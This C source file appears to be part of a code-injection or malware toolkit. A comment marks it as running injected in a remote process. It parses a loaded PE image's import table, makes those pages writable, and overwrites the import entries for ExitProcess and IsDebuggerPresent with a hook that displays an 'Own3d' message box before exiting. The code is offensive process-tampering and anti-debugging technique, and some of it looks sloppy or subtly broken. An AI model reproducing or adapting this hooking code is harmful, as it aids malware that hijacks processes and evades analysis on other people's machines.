#include "api.h"
#include "task_reply.h"
#include "misc.h"
#include "pe.h"

void (__stdcall *__real_ExitProcess)(DWORD dwExitCode);
//int __hook_ExitProcess(DWORD status);

int __pe_imp_reconstruct(unsigned long hMemory) { // not found injected in remote process
	PIMAGE_DOS_HEADER pDOSHeader;
	PIMAGE_NT_HEADERS32 pNTHeader;
	PIMAGE_SECTION_HEADER pSectionHeader;
	PIMAGE_DATA_DIRECTORY pDataDirectory;
	PIMAGE_THUNK_DATA32 pThunk,pOGThunk;
	PIMAGE_IMPORT_DESCRIPTOR pImportDescriptor;
	PIMAGE_IMPORT_BY_NAME pImportByName;
	int image_len;
	unsigned long	dwImageBase, dwImportTable, dwApiOffset, dwNameOffset, 
					dwRvaSize, dwHint, dwThunkTrace, dwImportSize;
	char dst[1024];
	char *name;
	int i=0;
	void *api;
	unsigned int oldProtect, written, offhook, ordinal;
	MEMORY_BASIC_INFORMATION memInfo;


	__real_ExitProcess = _GetProcAddress(_LoadLibraryA("kernel32.dll"), "ExitProcess");
	pDOSHeader = (PIMAGE_DOS_HEADER)hMemory;

	if (pDOSHeader->e_magic != IMAGE_DOS_SIGNATURE)
		return(-1);

	pNTHeader = (PIMAGE_NT_HEADERS32)((unsigned long)hMemory + pDOSHeader->e_lfanew);

	if (pNTHeader->Signature != IMAGE_NT_SIGNATURE)
		return(-1);


		
	dwImageBase = (unsigned long)pNTHeader->OptionalHeader.ImageBase;
	image_len = pNTHeader->OptionalHeader.SizeOfImage;
	dwRvaSize = pNTHeader->OptionalHeader.NumberOfRvaAndSizes;
	pImportDescriptor = (PIMAGE_IMPORT_DESCRIPTOR)(dwImageBase + pNTHeader->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_IMPORT].VirtualAddress);
	dwImportSize = (DWORD)(dwImageBase + pNTHeader->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_IMPORT].Size);
	
	dwImportTable = pImportDescriptor->DUMMYUNIONNAME.OriginalFirstThunk;
		

	while (pImportDescriptor->DUMMYUNIONNAME.Characteristics != NULL) {
		name = dwImageBase + pImportDescriptor->Name;
		//_printf("DLL: %s\n", name); //DEBUG
		
		pOGThunk = dwImageBase + pImportDescriptor->DUMMYUNIONNAME.OriginalFirstThunk;
		pThunk = dwImageBase + pImportDescriptor->FirstThunk;
		dwThunkTrace = dwImageBase + pImportDescriptor->FirstThunk;

		while ((pThunk->u1.AddressOfData) != 0 || (pThunk->u1.Ordinal) != 0) {
			dwApiOffset = pThunk->u1.Function;
			api = (void *)dwApiOffset;
			name = dwImageBase + pOGThunk->u1.ForwarderString + 2;
			//ordinal = _atoi(dwImageBase + pOGThunk->u1.ForwarderString);
			//_printf("(%s) 0x%08x -> 0x%08x\n", name, dwThunkTrace, dwApiOffset); //DEBUG
			if (_lstrcmpiA(name, "ExitProcess") == 0x00 || _lstrcmpiA(name,"IsDebuggerPresent")==0x00) {
				_VirtualQuery(pThunk, &memInfo, sizeof(memInfo));
				_VirtualProtect(memInfo.BaseAddress, memInfo.RegionSize, 0x40, &oldProtect);
				//pThunk->u1.Function = __hook_ExitProcess;
				*(unsigned int *)dwThunkTrace = __hook_ExitProcess;
				_VirtualProtect(memInfo.BaseAddress, memInfo.RegionSize, oldProtect, &oldProtect);
			}
			
			pThunk++;
			pOGThunk++;
			dwThunkTrace += sizeof(pThunk);
		}

	

		pImportDescriptor++;
		dwImportSize -= sizeof(PIMAGE_IMPORT_DESCRIPTOR);

	}

		
	return(0);
}



void  *__pe_imp_iatptr(void *hModule, const char *szFunction, const char *szDllName) {
	return(NULL);


}


__declspec(dllexport) void __hook_ExitProcess(DWORD status) {
	__asm { jmp ExitProcess_next }
	__asm _emit 'A' __asm _emit 'P' __asm _emit 'I' __asm _emit '1'
	__asm _emit 0x00
ExitProcess_next:
	_MessageBoxA(0x00, "Own3d", "Own3d", 0x01);
	__real_ExitProcess(0);
	return(0);
}